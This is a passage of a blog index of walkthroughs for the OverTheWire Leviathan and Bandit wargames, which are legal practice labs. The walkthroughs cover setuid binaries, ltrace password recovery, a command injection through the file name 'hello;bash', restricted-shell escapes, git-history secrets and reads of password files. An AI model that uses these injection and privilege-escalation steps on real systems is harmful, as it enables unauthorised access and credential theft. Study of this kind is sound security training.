"/posts/leviathan4/", "categories": "overthewire, overthewire-leviathan", "tags": "overthewire, leviathan", "date": "2022-03-02 23:05:00 +0000", "snippet": "Solution for the Overthewire.org Leviathan level 4Level GoalThere is no information for this level, intentionally.WalkthroughLogin to the server using the password obtained from the previous level Leviathan level 3.username: leviathan4ssh leviathan4@leviathan.labs.overthewire.org -p 2223With no description given first thing we do is check what is in the home directory.leviathan4@leviathan:~$ ls -altotal 24drwxr-xr-x 3 root root 4096 Aug 26 2019 .drwxr-xr-x 10 root root 4096 Aug 26 2019 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profiledr-xr-x--- 2 root leviathan4 4096 Aug 26 2019 .trashThere is a directory named .trash. Change directory into .trash and check what it contains.leviathan4@leviathan:~$ cd .trash/leviathan4@leviathan:~/.trash$ ls -aldr-xr-x--- 2 root leviathan4 4096 Aug 26 2019 .drwxr-xr-x 3 root root 4096 Aug 26 2019 ..-r-sr-x--- 1 leviathan5 leviathan4 7352 Aug 26 2019 binThere is an executable called bin and running it prints out 1’s and 0’s.leviathan4@leviathan:~/.trash$ ./bin01010100 01101001 01110100 01101000 00110100 01100011 01101111 01101011 01100101 01101001 00001010The 1’s and 0’s are binary representation of ascii.We need to convert the binary back to ascii.To do this we use Python3 and binascii library.leviathan4@leviathan:~/.trash$ python3Python 3.5.3 (default, Sep 27 2018, 17:25:39) [GCC 6.3.0 20170516] on linuxType \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; import binascii&gt;&gt;&gt; n = int('0b0101010001101001011101000110100000110100011000110110111101101011011001010110100100001010' , 2)&gt;&gt;&gt; s = binascii.unhexlify('%x' % n).decode()&gt;&gt;&gt; print(s)Tit*******" }, { "title": "Overthewire Leviathan Level 3", "url": "/posts/leviathan3/", "categories": "overthewire, overthewire-leviathan", "tags": "overthewire, leviathan", "date": "2022-03-02 22:50:00 +0000", "snippet": "Solution for the Overthewire.org Leviathan level 3Level GoalThere is no information for this level, intentionally.WalkthroughLogin to the server using the password obtained from the previous level Leviathan level 2.username: leviathan3ssh leviathan3@leviathan.labs.overthewire.org -p 2223With no description given first thing we do is check what is in the home directory.leviathan3@leviathan:~$ ls -altotal 32drwxr-xr-x 2 root root 4096 Aug 26 2019 .drwxr-xr-x 10 root root 4096 Aug 26 2019 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-r-sr-x--- 1 leviathan4 leviathan3 10288 Aug 26 2019 level3-rw-r--r-- 1 root root 675 May 15 2017 .profileThere is an executable named level3 with its setuid bit set.leviathan3@leviathan:~$ ./level3 Enter the password&gt; hellobzzzzzzzzap. WRONGlevel3 asks for a password when run.Since we don’t know the password we get the wrong message.Next run level3 with ltrace to see what it is doing.leviathan3@leviathan:~$ ltrace ./level3 __libc_start_main(0x8048618, 1, 0xffffd784, 0x80486d0 &lt;unfinished ...&gt;strcmp(\"h0no33\", \"kakaka\") = -1printf(\"Enter the password&gt; \") = 20fgets(Enter the password&gt; hello\"hello\\n\", 256, 0xf7fc55a0) = 0xffffd590strcmp(\"hello\\n\", \"snlprintf\\n\") = -1puts(\"bzzzzzzzzap. WRONG\"bzzzzzzzzap. WRONG) = 19+++ exited (status 0) +++The file is first comparing 2 string for no apparent reason. Then is prompts for a password.Compares the password we entered to the text ‘snlprintf’.It seems the password level3 is expecting is snlprintf.Running the file again and inputting the correct password will give us a shell prompt.leviathan3@leviathan:~$ ./level3 Enter the password&gt; snlprintf [You've got shell]!$Now we can use id to see who we are which is leviathan4.Using leviathan4 privileges we can read the password directly from /etc/leviathan_pass$ iduid=12004(leviathan4) gid=12003(leviathan3) groups=12003(leviathan3)$ cat /etc/leviathan_pass/leviathan4vuH*******" }, { "title": "Overthewire Leviathan Level 2", "url": "/posts/leviathan2/", "categories": "overthewire, overthewire-leviathan", "tags": "overthewire, leviathan", "date": "2022-03-02 22:30:00 +0000", "snippet": "Solution for the Overthewire.org Leviathan level 2Level GoalThere is no information for this level, intentionally.WalkthroughLogin to the server using the password obtained from the previous level Leviathan level 1.username: leviathan2ssh leviathan2@leviathan.labs.overthewire.org -p 2223With no description given first thing we do is check what is in the home directory.leviathan2@leviathan:~$ ls -altotal 28drwxr-xr-x 2 root root 4096 Aug 26 2019 .drwxr-xr-x 10 root root 4096 Aug 26 2019 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-r-sr-x--- 1 leviathan3 leviathan2 7436 Aug 26 2019 printfile-rw-r--r-- 1 root root 675 May 15 2017 .profileleviathan2@leviathan:~$ There is a executable named printfile that will run with leviathan3 permissions.When running the file we find out it takes a file name as it’s argument.leviathan2@leviathan:~$ ./printfile *** File Printer ***Usage: ./printfile filenameSince it runs with leviathan3 permissions we can try printing the password file leviathan3.leviathan2@leviathan:~$ ./printfile /etc/leviathan_pass/leviathan3You cant have that file...Using ltrace we can begin to see what the executable is doing.leviathan2@leviathan:~$ ltrace ./printfile /etc/leviathan_pass/leviathan3__libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 &lt;unfinished ...&gt;access(\"/etc/leviathan_pass/leviathan3\", 4) = -1puts(\"You cant have that file...\"You cant have that file...) = 27+++ exited (status 1) +++The first thing it does is call access. Access is used to check if the user has permission to access the given file, it also dereferences symbolic links so we cannot create a simlink to the password file.access() checks whether the calling process can access the file pathname. If pathname is a symbolic link, it is dereferenced.So we have seen what happens when we do not have permission to read a file, what happens when we do have the correct permission.We create a file sayHello and write ‘hello’ to the file.When we run printfile on sayHello we get the text ‘hello’ back.leviathan2@leviathan:/tmp/mine2$ echo \"hello\" &gt; sayHelloleviathan2@leviathan:/tmp/mine2$ lssayHelloleviathan2@leviathan:/tmp/mine2$ ~/printfile sayHello helloNow we can use ltrace to dig deeper into what printfile is doing.leviathan2@leviathan:/tmp/mine2$ ltrace ~/printfile sayHello __libc_start_main(0x804852b, 2, 0xffffd754, 0x8048610 &lt;unfinished ...&gt;access(\"sayHello\", 4) = 0snprintf(\"/bin/cat hello\", 511, \"/bin/cat %s\", \"sayHello\") = 14geteuid() = 12002geteuid() = 12002setreuid(12002, 12002) = 0system(\"/bin/cat sayHello\"hello &lt;no return ...&gt;--- SIGCHLD (Child exited) ---&lt;... system resumed&gt; ) = 0+++ exited (status 0) +++We can see that the file is checking if we have permission to access the file getting the effective uid setting the effective uid to leviathan3 using system to run /bin/cat on the given fileSince the input is being passed directly to system it is not performing any validation.We can pass other commands by creating files with special characters like ; which is used to enter multiple commands in the terminal.leviathan2@leviathan:/tmp/mine2$ touch 'hello;bash'leviathan2@leviathan:/tmp/mine2$ ~/printfile 'hello;bash' /bin/cat: hello: No such file or directoryleviathan3@leviathan:/tmp/mine2$ Now we have a shell as leviathan3, we can read the password file.leviathan3@leviathan:/tmp/min2$ cat /etc/leviathan_pass/leviathan3Ahd*******" }, { "title": "Overthewire Leviathan Level 1", "url": "/posts/leviathan1/", "categories": "overthewire, overthewire-leviathan", "tags": "overthewire, leviathan", "date": "2022-02-28 23:30:00 +0000", "snippet": "Solution for the Overthewire.org Leviathan level 1Level GoalThere is no information for this level, intentionally.WalkthroughLogin to the server using the password obtained from the previous level Leviathan level 0.username: leviathan1ssh leviathan1@leviathan.labs.overthewire.org -p 2223With no description given first thing we do is check what is in the home directory.leviathan1@leviathan:~$ ls -altotal 28drwxr-xr-x 2 root root 4096 Aug 26 2019 .drwxr-xr-x 10 root root 4096 Aug 26 2019 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-r-sr-x--- 1 leviathan2 leviathan1 7452 Aug 26 2019 check-rw-r--r-- 1 root root 675 May 15 2017 .profileWe can see an executable file named check.Its setuid bit is checked meaning when we run the file we gain the same privileges as leviathan2We run this file to see what it does.leviathan1@leviathan:~$ ./check password: helloWrong password, Good Bye ...Since we don’t know the password it will tell us ‘wrong password’We can use ltrace to debug the file and see what library calls it is making to further understand what it is doing.leviathan1@leviathan:~$ ltrace ./check __libc_start_main(0x804853b, 1, 0xffffd784, 0x8048610 &lt;unfinished ...&gt;printf(\"password: \") = 10getchar(1, 0, 0x65766f6c, 0x646f6700password: hello) = 104getchar(1, 0, 0x65766f6c, 0x646f6700) = 101getchar(1, 0, 0x65766f6c, 0x646f6700) = 108strcmp(\"hel\", \"sex\") = -1puts(\"Wrong password, Good Bye ...\"Wrong password, Good Bye ...) = 29+++ exited (status 0) +++leviathan1@leviathan:~$We can see that the program is: Printing the text ‘password’ Getting the input from the user Comparing the first 3 characters of our input to the text ‘sex’ Since we inputted the wrong password we get the ‘Wrong password’ message.Based on the strcmp we can understand the password needed is ‘sex’.Let’s run the file again and enter the correct password.leviathan1@leviathan:~$ ./check password: sex$We are given a new terminal prompt. Using the id command we can see we have uid of leviathan2.$ iduid=12002(leviathan2) gid=12001(leviathan1) groups=12001(leviathan1)Since we are leviathan2 now we can read the password directly from the leviathan_pass directory.$ cat /etc/leviathan_pass/leviathan2oug*******" }, { "title": "Overthewire Leviathan Level 0", "url": "/posts/leviathan0/", "categories": "overthewire, overthewire-leviathan", "tags": "overthewire, leviathan", "date": "2022-02-28 22:45:00 +0000", "snippet": "Solution for the Overthewire.org Leviathan level 0Level GoalThere is no information for this level, intentionally.WalkthroughLogin to the server using the provided username and password.username: leviathan0password: leviathan0ssh leviathan0@leviathan.labs.overthewire.org -p 2223With no description given first thing we do is check what is in the home directory.leviathan0@leviathan:~$ ls leviathan0@leviathan:~$ ls -altotal 24drwxr-xr-x 3 root root 4096 Aug 26 2019 .drwxr-xr-x 10 root root 4096 Aug 26 2019 ..drwxr-x--- 2 leviathan1 leviathan0 4096 Aug 26 2019 .backup-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profilels shows nothing in the home directory. When we use ls -al to list all files and directories we can now see a directory named .backup.leviathan0@leviathan:~$ cd .backup/leviathan0@leviathan:~/.backup$ lsbookmarks.htmlThe only thing inside .backup is a html file bookmarks.html.We can now use grep to search the file for given words.Grep is used in this format grep &lt;WORD TO BE SEARCHED&gt; &lt;FILE TO BE SEARCH&gt;leviathan0@leviathan:~/.backup$ grep password bookmarks.html&lt;DT&gt;&lt;A HREF=\"http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is rioG******\" ADD_DATE=\"1155384634\" LAST_CHARSET=\"ISO-8859-1\" ID=\"rdf:#$2wIU71\"&gt;password to leviathan1&lt;/A&gt; leviathan0@leviathan:~/.backup$We can see that searching for the word password found the password for the next challenge.This will be fixed later, the password for leviathan1 is rioG******" }, { "title": "Overthewire Bandit Level 33 -> 34", "url": "/posts/bandit33-34/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2022-02-22 00:10:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 33 -&gt; 34Level GoalAt this moment, level 34 does not exist yet.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 32 -&gt; 33.username: bandit33ssh bandit33@bandit.labs.overthewire.org -p 2220Using ls we can see a README.txt file in the home directory.Catting this file will give a congratulation message.bandit33@bandit:~$ cat README.txtCongratulations on solving the last level of this game!At this moment, there are no more levels to play in this game. However, we are constantly workingon new levels and will most likely expand this game with more levels soon.Keep an eye out for an announcement on our usual communication channels!In the meantime, you could play some of our other wargames.If you have an idea for an awesome new level, please let us know!The end!" }, { "title": "Overthewire Bandit Level 32 -> 33", "url": "/posts/bandit32-33/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit, git", "date": "2022-02-21 23:50:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 32 -&gt; 33Level GoalAfter all this git stuff its time for another escape. Good luck!Commands you may need to solve this levelWalkthroughLogin to the server using the password obtained from the previous level Bandit level 31 -&gt; 32.username: bandit32ssh bandit32@bandit.labs.overthewire.org -p 2220After logging in we can see a different welcome message and prompt.WELCOME TO THE UPPERCASE SHELL&gt;&gt;Any command that is typed into this prompt will be changed to upper case. This is an issue since linux commands are case sensitive and mostly lower case.There are a few commands that are upper case by default that we can test.&gt;&gt; $SHELLWELCOME TO THE UPPERCASE SHELL&gt;&gt; $SHELL worked so what other environment variables can we use to.We can run $0 which is generally the first argument of a script, which basically it is its name.&gt;&gt; $0$ Now we have a normal prompt again we can enter commands as normal.$ ls -la total 28drwxr-xr-x 2 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profile-rwsr-x--- 1 bandit33 bandit32 7556 May 7 2020 uppershellWe can see an uppershell script and its SUID bit is set. So uppershell is run as user bandit33.$ iduid=11033(bandit33) gid=11032(bandit32) groups=11032(bandit32)Using the id command we can see we have a uid for bandit33.Since we are running as bandit33 all we have to do now is read the /etc/bandit_password/bandit33 to get the password.$ cat /etc/bandit_pass/bandit33c9c319##########################" }, { "title": "Overthewire Bandit Level 31 -> 32", "url": "/posts/bandit31-32/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit, git", "date": "2022-02-20 23:50:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 31 -&gt; 32Level GoalThere is a git repository at ssh://bandit31-git@localhost/home/bandit31-git/repo.The password for the user bandit31-git is the same as for the user bandit31.Clone the repository and find the password for the next level.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 30 -&gt; 31.username: bandit31ssh bandit31@bandit.labs.overthewire.org -p 2220After logging in to the server we create a working directory in /tmp and clone the git repo.The password is the same as the one used to login to this level.bandit31@bandit:~$ mkdir /tmp/bandit31bandit31@bandit:~$ cd /tmp/bandit31bandit31@bandit:/tmp/bandit31$ git clone ssh://bandit31-git@localhost/home/bandit31-git/repoCloning into 'repo'...bandit31-git@localhost's password:remote: Counting objects: 4, done.remote: Compressing objects: 100% (3/3), done.remote: Total 4 (delta 0), reused 0 (delta 0)Receiving objects: 100% (4/4), done.First we change directory into the repo and check the README.md filebandit31@bandit:/tmp/bandit31$ cd repo/bandit31@bandit:/tmp/bandit31/repo$ cat README.mdThis time your task is to push a file to the remote repository.Details: File name: key.txt Content: 'May I come in?' Branch: masterFor this challenge we need to write May I come in? to a file named key.txt and then commit and push the change to the remote repository.First thing is to create the file and write the text into it.bandit31@bandit:/tmp/bandit31/repo$ echo 'May I come in?' &gt; key.txtCommiting the filebandit31@bandit:/tmp/bandit31/repo$ git add key.txtThe following paths are ignored by one of your .gitignore files:key.txtUse -f if you really want to add them.When adding key.txt we are informed that it will be ignored because of the .gitignore file.We can either edit the .gitignore file and remove the line containing key.txt or we can use the -f to force git to add the file.bandit31@bandit:/tmp/bandit31/repo$ git add -f key.txtbandit31@bandit:/tmp/bandit31/repo$ git commit -m 'adding key.txt'[master 559b881] adding key 1 file changed, 1 insertion(+) create mode 100644 key.txtWith key.txt committed to the git repository we now need to push the commit to the remote.bandit31@bandit:/tmp/bandit31/repo$ git pushCould not create directory '/home/bandit31/.ssh'.The authenticity of host 'localhost (127.0.0.1)' can't be established.ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.Are you sure you want to continue connecting (yes/no)? yesFailed to add the host to the list of known hosts (/home/bandit31/.ssh/known_hosts).This is a OverTheWire game server. More information on http://www.overthewire.org/wargamesbandit31-git@localhost's password: Counting objects: 3, done.Delta compression using up to 2 threads.Compressing objects: 100% (2/2), done.Writing objects: 100% (3/3), 322 bytes | 0 bytes/s, done.Total 3 (delta 0), reused 0 (delta 0)remote: ### Attempting to validate files... ####remote:remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.remote:remote: Well done! Here is the password for the next level:remote: 56a9bf##########################remote:remote: .oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.oOo.remote:To ssh://localhost/home/bandit31-git/repo ! [remote rejected] master -&gt; master (pre-receive hook declined)error: failed to push some refs to 'ssh://bandit31-git@localhost/home/bandit31-git/repo'After pushing the commit we get a message with the password for the next challenge." }, { "title": "Overthewire Bandit Level 30 -> 31", "url": "/posts/bandit30-31/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit, git", "date": "2022-02-20 22:50:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 30 -&gt; 31Level GoalThere is a git repository at ssh://bandit30-git@localhost/home/bandit30-git/repo.The password for the user bandit30-git is the same as for the user bandit30.Clone the repository and find the password for the next level.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 29 -&gt; 30.username: bandit30ssh bandit30@bandit.labs.overthewire.org -p 2220After logging in to the server we create a working directory in /tmp and clone the git repo.The password is the same as the one used to login to this level.bandit30@bandit:~$ mkdir /tmp/bandit30bandit30@bandit:~$ cd /tmp/bandit30bandit30@bandit:/tmp/bandit30$ git clone ssh://bandit30-git@localhost/home/bandit30-git/repoCloning into 'repo'...bandit30-git@localhost's password:remote: Counting objects: 4, done.remote: Total 4 (delta 0), reused 0 (delta 0)Receiving objects: 100% (4/4), done.First we change directory into the repo and check the README.md filebandit30@bandit:/tmp/bandit30$ cd repobandit30@bandit:/tmp/bandit30/repo$ cat README.mdjust an epmty file... muahahaNothing of interest in the README.md file.Next check the commit logs.bandit30@bandit:/tmp/bandit30/repo$ git logcommit 3aefa229469b7ba1cc08203e5d8fa299354c496bAuthor: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:54 2020 +0200 initial commit of README.mdThe only commit is the initial commit which means the file was never changed after first commit.Next on to checking for branches.bandit30@bandit:/tmp/bandit30/repo$ git branch -a* master remotes/origin/HEAD -&gt; origin/master remotes/origin/masterNo other branches locally or remote. Another dead end.Next I began looking at the .git directorybandit30@bandit:/tmp/bandit30/repo$ cd .gitbandit30@bandit:/tmp/bandit30/repo/.git$ lsbranches config description HEAD hooks index info logs objects packed-refs refsI started checking the files in .git and packed-refs contained something of interest.bandit30@bandit:/tmp/bandit30/repo/.git$ cat packed-refs# pack-refs with: peeled fully-peeled3aefa229469b7ba1cc08203e5d8fa299354c496b refs/remotes/origin/masterf17132340e8ee6c159e0a4a6bc6f80e1da3b1aea refs/tags/secretWe can see a secret tag listed in the packed-refs.Using the git tag command we can list all tags.bandit30@bandit:/tmp/working_dir/repo$ git tagsecretTo view the secret we use git show secret and it contained the password.bandit30@bandit:/tmp/working_dir/repo$ git show secret47e603##########################" }, { "title": "Overthewire Bandit Level 29 -> 30", "url": "/posts/bandit29-30/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit, git", "date": "2022-02-19 23:30:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 29 -&gt; 30Level GoalThere is a git repository at ssh://bandit29-git@localhost/home/bandit29-git/repo.The password for the user bandit29-git is the same as for the user bandit29.Clone the repository and find the password for the next level.WalkthroughThis is another git challenge. We will be cloning git repositories and then search the repo for a password.Login to the server using the password obtained from the previous level Bandit level 28 -&gt; 29.username: bandit29ssh bandit29@bandit.labs.overthewire.org -p 2220After logging in to the server we create a working directory in /tmp and clone the git repo.The password is the same as the one used to login to this level.bandit29@bandit:~$ mkdir /tmp/bandit29bandit29@bandit:~$ cd /tmp/bandit29bandit29@bandit:/tmp/bandit29$ git clone ssh://bandit29-git@localhost/home/bandit29-git/repoCloning into 'repo'...bandit29-git@localhost's password:remote: Counting objects: 16, done.remote: Compressing objects: 100% (11/11), done.remote: Total 16 (delta 2), reused 0 (delta 0)Receiving objects: 100% (16/16), done.Resolving deltas: 100% (2/2), done.bandit29@bandit:/tmp/bandit29$ cd repoFirst we check the README.md file to see what information it contains.bandit29@bandit:/tmp/bandit29/repo$ cat README.md# Bandit NotesSome notes for bandit30 of bandit.## credentials- username: bandit30- password: &lt;no passwords in production!&gt;The README.md does not contain the password but it does give a clue to where the password is.The text &lt;no passwords in production!&gt; lets us know that there are more then one branch on this repo.A git branch is a parallel line of work in a git repo that does not interfere with the main branch. It can later be merged into the main branch.Using the git branch command we can see what the names of the other branches are.bandit29@bandit:/tmp/bandit29/repo$ git branch* masterOnly one branch is listed meaning the other branches are not local to our machine.git branch -a will display all branches local and remote.bandit29@bandit:/tmp/bandit29/repo$ git branch -a* master remotes/origin/HEAD -&gt; origin/master remotes/origin/dev remotes/origin/master remotes/origin/sploits-devWe can see a dev branch is listed now.We change to different branches by using git checkout.bandit29@bandit:/tmp/bandit29/repo$ git checkout remotes/origin/devNote: checking out 'remotes/origin/dev'.You are in 'detached HEAD' state. You can look around, make experimentalchanges and commit them, and you can discard any commits you make in thisstate without impacting any branches by performing another checkout.If you want to create a new branch to retain commits you create, you maydo so (now or later) by using -b with the checkout command again. Example: git checkout -b &lt;new-branch-name&gt;HEAD is now at bc83328... add data needed for developmentNow in the dev branch we can read the README.md to get the password.bandit29@bandit:/tmp/bandit29/repo$ cat README.md# Bandit NotesSome notes for bandit30 of bandit.## credentials- username: bandit30- password: 5b9057##########################" }, { "title": "Overthewire Bandit Level 28 -> 29", "url": "/posts/bandit28-29/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit, git", "date": "2022-02-02 17:30:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 28 -&gt; 29Level GoalThere is a git repository at ssh://bandit28-git@localhost/home/bandit28-git/repo.The password for the user bandit28-git is the same as for the user bandit28.Clone the repository and find the password for the next level.WalkthroughThis is another git challenge. We will be cloning git repositories and then search the repo for a password.Login to the server using the password obtained from the previous level Bandit level 27 -&gt; 28.username: bandit28ssh bandit28@bandit.labs.overthewire.org -p 2220Now that we are logged in we will create a working directory to clone the repository in to. When cloning the repository we use the same password we used to log into this level.bandit28@bandit:~$ mkdir /tmp/bandit28bandit28@bandit:~$ cd /tmp/bandit28bandit28@bandit:/tmp/bandit28$ git clone ssh://bandit28-git@localhost/home/bandit28-git/repoCloning into 'repo'...bandit28-git@localhost's password:remote: Counting objects: 3, done.remote: Compressing objects: 100% (2/2), done.remote: Total 3 (delta 0), reused 0 (delta 0)Receiving objects: 100% (3/3), done.bandit28@bandit:/tmp/bandit28$After cloning the repository we change directory into repo and see what files are there.bandit28@bandit:/tmp/bandit28$ lsrepobandit28@bandit:/tmp/bandit28$ cd repo/bandit28@bandit:/tmp/bandit28/repo$ lsREADME.mdLike the previous challenge there is only a single file in the git repository README. Unlike the previous challenge the password was removed from the README file.bandit28@bandit:/tmp/bandit28/repo$ cat README.md# Bandit NotesSome notes for level29 of bandit.## credentials- username: bandit29- password: xxxxxxxxxxSince this is a git repository we can see the history of the README.md. Using the git log command we can see the list of commits made on the repository.bandit28@bandit:/tmp/bandit28/repo$ git logcommit edd935d60906b33f0619605abd1689808ccdd5eeAuthor: Morla Porla &lt;morla@overthewire.org&gt;Date: Thu May 7 20:14:49 2020 +0200 fix info leakcommit c086d11a00c0648d095d04c089786efef5e01264Author: Morla Porla &lt;morla@overthewire.org&gt;Date: Thu May 7 20:14:49 2020 +0200 add missing datacommit de2ebe2d5fd1598cd547f4d56247e053be3fdc38Author: Ben Dover &lt;noone@overthewire.org&gt;Date: Thu May 7 20:14:49 2020 +0200 initial commit of README.mdUsing git log we can see the author, date and a description message for each commit. The most recent commit is what we see when looking at the repo.Git log shows 3 commits in the history of the repo. fix info leak (current position) add missing data initial commit of README.mdBy reading the commit descriptions we can assume the password was removed in the fix info leak commit. We need to see what was in the other commits.Using git diff &lt;commit id&gt; we can see what changes were made between the current commit and the commit id we enter.We can use the commit id of the add missing data commit to see what was in the README before the info leak was fixed.bandit28@bandit:/tmp/bandit28/repo$ git diff c086d11a00c0648d095d04c089786efef5e01264diff --git a/README.md b/README.mdindex 3f7cee8..5c6457b 100644--- a/README.md+++ b/README.md@@ -4,5 +4,5 @@ Some notes for level29 of bandit. ## credentials - username: bandit29-- password: bbc965##########################+- password: xxxxxxxxxxHaving used git diff we can see that the password was removed from the README but we can still read it from the output of the diff.Alternate SolutionAn alternate method to solve this challenge is to use git checkout &lt;commit id&gt; to revert the repository back to a previous state and then read the README file.bandit28@bandit:/tmp/bandit28/repo$ git checkout c086d11a00c0648d095d04c089786efef5e01264Note: checking out 'c086d11a00c0648d095d04c089786efef5e01264'.You are in 'detached HEAD' state. You can look around, make experimentalchanges and commit them, and you can discard any commits you make in thisstate without impacting any branches by performing another checkout.If you want to create a new branch to retain commits you create, you maydo so (now or later) by using -b with the checkout command again. Example: git checkout -b &lt;new-branch-name&gt;HEAD is now at c086d11... add missing databandit28@bandit:/tmp/bandit28/repo$ cat README.md# Bandit NotesSome notes for level29 of bandit.## credentials- username: bandit29- password: bbc965##########################" }, { "title": "Overthewire Bandit Level 27 -> 28", "url": "/posts/bandit27-28/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit, git", "date": "2022-02-01 22:45:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 27 -&gt; 28Level GoalThere is a git repository at ssh://bandit27-git@localhost/home/bandit27-git/repo.The password for the user bandit27-git is the same as for the user bandit27.Clone the repository and find the password for the next level.WalkthroughThese next few challenges are git related. We will be cloning git repositories and then search the repo for a password.Login to the server using the password obtained from the previous level Bandit level 26 -&gt; 27.username: bandit27ssh bandit27@bandit.labs.overthewire.org -p 2220Now that we are logged in we will create a working directory to clone the repository in to. When cloning the repository we use the same password we used to log into this level.bandit27@bandit:~$ mkdir /tmp/bandit27bandit27@bandit:~$ cd /tmp/bandit27bandit27@bandit:/tmp/bandit27$ git clone ssh://bandit27-git@localhost/home/bandit27-git/repoCloning into 'repo'...bandit27-git@localhost's password:remote: Counting objects: 3, done.remote: Compressing objects: 100% (2/2), done.remote: Total 3 (delta 0), reused 0 (delta 0)Receiving objects: 100% (3/3), done.bandit27@bandit:/tmp/bandit27$After cloning the repository we change directory into repo and see what files are there.bandit27@bandit:/tmp/bandit27$ lsrepobandit27@bandit:/tmp/bandit27$ cd repo/bandit27@bandit:/tmp/bandit27/repo$ lsREADMEWe can see that there is only one file README and reading the file will give us the password.bandit27@bandit:/tmp/bandit27/repo$ cat README The password to the next level is: 0ef186##########################" }, { "title": "Overthewire Bandit Level 26-> 27", "url": "/posts/bandit26-27/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2022-01-07 22:45:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 26 -&gt; 27Level GoalGood job getting a shell! Now hurry and grab the password for bandit27!WalkthroughLogin to the server using the steps in the previous level Bandit level 25 -&gt; 26.Having completed bandit level 25 -&gt; 26 we now have a bash shell on bandit26.The first thing to do is check the home directory.bandit26@bandit:~$ ls -altotal 36drwxr-xr-x 3 root root 4096 May 7 2020 .drwxr-xr-x 41 root root 4096 May 7 2020 ..-rwsr-x--- 1 bandit27 bandit26 7296 May 7 2020 bandit27-do-rw-r--r-- 1 root root 220 May 15 2017 .bash_logout-rw-r--r-- 1 root root 3526 May 15 2017 .bashrc-rw-r--r-- 1 root root 675 May 15 2017 .profiledrwxr-xr-x 2 root root 4096 May 7 2020 .ssh-rw-r----- 1 bandit26 bandit26 258 May 7 2020 text.txtThere is a bandit27-do file and it has the setuid bit set.-rwsr-x--- 1 bandit27 bandit26 7296 May 7 2020 bandit27-doThis means we can use bandit27-do to run files with elevated priviledges.bandit26@bandit:~$ ./bandit27-doRun a command as another user. Example: ./bandit27-do idbandit26@bandit:~$ ./bandit27-do iduid=11026(bandit26) gid=11026(bandit26) euid=11027(bandit27) groups=11026(bandit26)bandit27-do takes another command as its argument and then runs that command as user bandit27.When running bandit27-do id we can see the euid is bandit27.All we need to do now is read the password file for bandit27.bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit273ba311##########################" }, { "title": "Overthewire Bandit Level 25-> 26", "url": "/posts/bandit25-26/", "categories": "overthewire, overthewire-bandit", "tags": "overthewire, bandit", "date": "2022-01-07 22:20:00 +0000", "snippet": "Solution for the Overthewire.org Bandit level 25 -&gt; 26Level GoalLogging in to bandit26 from bandit25 should be fairly easy… The shell for user bandit26 is not /bin/bash, but something else. Find out what it is, how it works and how to break out of it.WalkthroughLogin to the server using the password obtained from the previous level Bandit level 24 -&gt; 25.username: bandit25ssh bandit25@bandit.labs.overthewire.org -p 2220When checking the home directory we can see an ssh key for bandit26.bandit25@bandit:~$ lsbandit26.sshkeyWhen using the ssh key to log into bandit26 we see a Bandit26 message and then the connection is closed.bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost _ _ _ _ ___ __ | | | (_) | |__ \\ / / | |__ __ _ _ __ __| |_| |_ ) / /_ | '_ \\ / _` | '_ \\ / _` | | __| / / '_ \\ | |_) | (_| | | | | (_| | | |_ / /| (_) | |_.__/ \\__,_|_| |_|\\__,_|_|\\__|____\\___/Connection to localhost closed.bandit25@bandit:~$According to the level description bandit26 is not running /bin/bash like the other levels. So what shell is bandit26 running ?We can find this out by checking /etc/passwd and finding user bandit26.bandit25@bandit:~$ cat /etc/passwd | grep bandit26bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtextIt looks like bandit26 is running /usr/bin/showtext instead of /bin/bash.Let’s check what showtext is doing.bandit25@bandit:~$ cat /usr/bin/showtext #!/bin/shexport TERM=linuxmore ~/text.txtexit 0Showtext is using more to display the contents of text.txt to the screen and then is exiting.more is used to view file contents one screenful at a time.Through checking the man page we can find different options to use. One such option is v when used while more is still running. It allows us to open a vi editor which we can then read/edit other files.Extract from the more man page v Start up an editor at current line. The editor is taken from the environment variable VISUAL if defined, or EDITOR if VISUAL is not defined, or defaults to 